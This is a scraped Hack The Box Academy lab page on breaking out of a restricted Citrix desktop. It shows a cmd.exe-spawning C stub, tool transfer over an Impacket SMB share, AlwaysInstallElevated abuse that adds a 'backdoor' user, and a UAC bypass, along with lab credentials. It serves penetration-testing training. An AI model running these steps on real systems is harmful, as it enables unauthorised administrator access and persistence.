<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/67/section/2502
// Platform Version: V1
// Module ID: 67
// Module Name: Windows Privilege Escalation
// Module Difficulty: Medium
// Section ID: 2502
// Section Title: Citrix Breakout
// Page Title: Windows Privilege Escalation
// Page Number: 24
-->

# Citrix Breakout

**Module Name:** Windows Privilege Escalation **Page Number:** 24

#### WINDOWS PRIVILEGE ESCALATION

# Citrix Breakout

```: citrixcredentials
Username: pmorgan
Password: Summer1Summer!
  Domain: htb.local
```

## Bypassing Path Restrictions

![https://academy.hackthebox.com/storage/modules/67/C_users_restricted.png](https://academy.hackthebox.com/storage/modules/67/C_users_restricted.png)

![https://academy.hackthebox.com/storage/modules/67/paint.png](https://academy.hackthebox.com/storage/modules/67/paint.png)

![https://academy.hackthebox.com/storage/modules/67/paint_flag.png](https://academy.hackthebox.com/storage/modules/67/paint_flag.png)

## Accessing SMB share from restricted environment

``` shell-session
root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

![https://academy.hackthebox.com/storage/modules/67/paint_share.png](https://academy.hackthebox.com/storage/modules/67/paint_share.png)

![https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png](https://academy.hackthebox.com/storage/modules/67/pwn_cmd.png)

``` c
#include <stdlib.h>
int main() {
  system("C:\\Windows\\System32\\cmd.exe");
}
```

![https://academy.hackthebox.com/storage/modules/67/xcopy.png](https://academy.hackthebox.com/storage/modules/67/xcopy.png)

## Alternate Explorer

![https://academy.hackthebox.com/storage/modules/67/Explorer++.png](https://academy.hackthebox.com/storage/modules/67/Explorer++.png)

## Alternate Registry Editors

![https://academy.hackthebox.com/storage/modules/67/smallregistry.png](https://academy.hackthebox.com/storage/modules/67/smallregistry.png)

## Modify existing shortcut file

![https://academy.hackthebox.com/storage/modules/67/shortcut_1.png](https://academy.hackthebox.com/storage/modules/67/shortcut_1.png)

![https://academy.hackthebox.com/storage/modules/67/shortcut_2.png](https://academy.hackthebox.com/storage/modules/67/shortcut_2.png)

![https://academy.hackthebox.com/storage/modules/67/shortcut_3.png](https://academy.hackthebox.com/storage/modules/67/shortcut_3.png)

## Script Execution

![https://academy.hackthebox.com/storage/modules/67/script_bat.png](https://academy.hackthebox.com/storage/modules/67/script_bat.png)

## Escalating Privileges

``` cmd-session
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
		AlwaysInstallElevated    REG_DWORD    0x1
```

``` powershell-session
PS C:\Users\pmorgan\Desktop> Import-Module .\PowerUp.ps1
PS C:\Users\pmorgan\Desktop> Write-UserAddMSI
	
Output Path
-----------
UserAdd.msi
```

![https://academy.hackthebox.com/storage/modules/67/useradd.png](https://academy.hackthebox.com/storage/modules/67/useradd.png)

``` cmd-session
C:\> runas /user:backdoor cmd

Enter the password for backdoor: T3st@123
Attempting to start cmd as user "VDESKTOP3\backdoor" ...
```

## Bypassing UAC

``` cmd-session
C:\Windows\system32> cd C:\Users\Administrator

Access is denied.
```

``` powershell-session
PS C:\Users\Public> Import-Module .\Bypass-UAC.ps1
PS C:\Users\Public> Bypass-UAC -Method UacMethodSysprep
```

![https://academy.hackthebox.com/storage/modules/67/bypass_uac.png](https://academy.hackthebox.com/storage/modules/67/bypass_uac.png)

![https://academy.hackthebox.com/storage/modules/67/flag.png](https://academy.hackthebox.com/storage/modules/67/flag.png)

#### Addditional resources worth checking:

# 

# 

#### Questions

####